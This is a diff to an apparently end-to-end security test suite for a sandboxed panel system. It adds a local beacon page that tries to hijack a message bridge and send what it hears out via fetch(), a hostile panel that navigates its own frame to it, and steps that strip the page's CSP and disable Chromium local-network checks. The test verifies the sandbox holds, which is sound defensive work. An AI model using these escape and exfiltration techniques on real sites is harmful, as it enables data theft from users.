@@ -44,9 +44,20 @@ if (process.env.CG_E2E_SKIP_DEPLOY !== "1") {
   execFileSync("node", ["scripts/deploy-static.mjs", "--only", "player"], { cwd: ENGINE, stdio: "ignore", env: anonymous });
 }
 
-// A beacon server: any request reaching it is a leak.
+// A beacon server: any request reaching it is a leak. /nav is a page a panel may navigate its own frame to: it
+// tries to speak the bridge with the nonce it was handed and reports anything it hears back to /got.
 const hits: string[] = [];
-const beacon = createServer((req, res) => { hits.push(req.url ?? ""); res.end("leak"); });
+const NAV_PAGE = `<!doctype html><script>
+const nonce = new URLSearchParams(location.hash.slice(1)).get("n");
+addEventListener("message", e => { fetch("/got?" + encodeURIComponent(JSON.stringify(e.data).slice(0, 200))); });
+parent.postMessage({ type: "ready", nonce }, "*");
+parent.postMessage({ type: "subscribe", id: "x", name: "player.observation", args: {}, nonce }, "*");
+parent.postMessage({ type: "command", id: "c", envelope: { command: { type: "ready", ready: true } }, nonce }, "*");
+</script>`;
+const beacon = createServer((req, res) => {
+  hits.push(req.url ?? "");
+  if (req.url?.startsWith("/nav")) { res.setHeader("content-type", "text/html"); res.end(NAV_PAGE); } else res.end("leak");
+});
 await new Promise<void>(r => beacon.listen(0, "127.0.0.1", r));
 const BEACON = `http://127.0.0.1:${(beacon.address() as { port: number }).port}`;
 
@@ -162,6 +173,50 @@ export default definePanel({ title: "Hostile", Component() {
   assert(hits.length === 0, `the beacon server was reached: ${hits.join(", ")}`);
 });
 
+await check("a panel that navigates its own frame away is stopped; the page it loads hears nothing from the bridge", async () => {
+  // The frame's own CSP cannot stop it navigating itself; the hosted page's `frame-src 'self'` does (it governs
+  // navigations of its child frames), so the request never leaves. Without that CSP (a dev server), the page the
+  // frame loads must still hear nothing: it does not own the bridge's MessagePort.
+  hits.length = 0;
+  await save("e2e-navigates", `import { useEffect } from "react";
+import { definePanel } from "@sdk";
+export default definePanel({ title: "Navigates", Component() {
+  useEffect(() => { const t = setTimeout(() => { location.href = ${JSON.stringify(BEACON)} + "/nav" + location.hash; }, 300); return () => clearTimeout(t); }, []);
+  return <p>leaving</p>;
+} });
+`);
+  await page.waitForSelector('[data-testid="panel-error-stored:e2e-navigates"]', { timeout: 30_000 });
+  assert(/navigate away/.test(await page.textContent('[data-testid="panel-error-stored:e2e-navigates"]') ?? ""), "stopped message");
+  await sleep(2000);
+  assert(!hits.some(h => h.startsWith("/nav")), "the navigation reached its target despite the page's frame-src");
+  assert(!hits.some(h => h.startsWith("/got")), "the navigated page heard the bridge");
+
+  // The same page without its CSP, as in a dev server: the navigation happens, the new page still hears nothing.
+  // A page served through route.fulfill has no address, so Chromium's local-network checks would block its
+  // WebSocket to the local engine: this one browser runs without them.
+  const lax = await chromium.launch({ args: ["--disable-features=LocalNetworkAccessChecks"] });
+  const laxContext = await lax.newContext();
+  await laxContext.addCookies([{ name: "cg_session", value: session, url: SITE }]);
+  const bare = await laxContext.newPage();
+  const bareLog: string[] = [];
+  bare.on("console", m => bareLog.push(m.text().slice(0, 150)));
+  bare.on("pageerror", e => bareLog.push("pageerror " + e.message.slice(0, 150)));
+  await bare.route(url => url.pathname === "/player/", async route => {
+    const response = await route.fetch();
+    await route.fulfill({ response, body: (await response.text()).replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, "") });
+  });
+  await bare.goto(`${SITE}/player/?room=${shortCode}`);
+  await bare.waitForSelector('[data-testid="panel-error-stored:e2e-navigates"]', { timeout: 60_000 }).catch(async error => {
+    throw new Error(`no CSP: ${(error as Error).message.split("\n")[0]}; hits ${hits.join(", ")}; frame ${await bare.getAttribute('[data-testid="panel-frame-stored:e2e-navigates"]', "data-frame-state").catch(() => "none")}; csp ${await bare.locator('meta[http-equiv="Content-Security-Policy"]').count()}; text ${(await bare.innerText("body")).slice(0, 300).replace(/\s+/g, " ")}; log ${bareLog.slice(0, 5).join(" | ")}`);
+  });
+  await sleep(2500);
+  assert(hits.some(h => h.startsWith("/nav")), `without the page CSP the frame should have navigated: ${hits.join(", ")}`);
+  const heard = hits.filter(h => h.startsWith("/got"));
+  assert(heard.length === 0, `the navigated page heard: ${heard.map(decodeURIComponent).join(" | ")}`);
+  await lax.close();
+  await carol.mutation(fn.m("panels:remove"), { slug: "e2e-navigates" });
+});
+
 await check("a chat from a panel shows the host's confirmation; nothing is sent until confirmed", async () => {
   const TEXT = `hello from a stored panel ${Date.now()}`;
   await save("e2e-chat", `import { useState } from "react";
@@ -228,7 +283,8 @@ await check("?panels=off loads only the core console", async () => {
 await check("the hosted page runs under its CSP without violations of its own", async () => {
   const csp = await page.getAttribute('meta[http-equiv="Content-Security-Policy"]', "content");
   assert(csp?.includes("connect-src 'self' " + new URL(CLOUD).origin), `page CSP: ${csp}`);
-  const own = cspReports;
+  // Expected: the navigating panel's frame was refused by frame-src (checked above).
+  const own = cspReports.filter(t => !t.includes(`Framing '${BEACON}/`));
   assert(own.length === 0, own.slice(0, 2).join(" | "));
 });
 
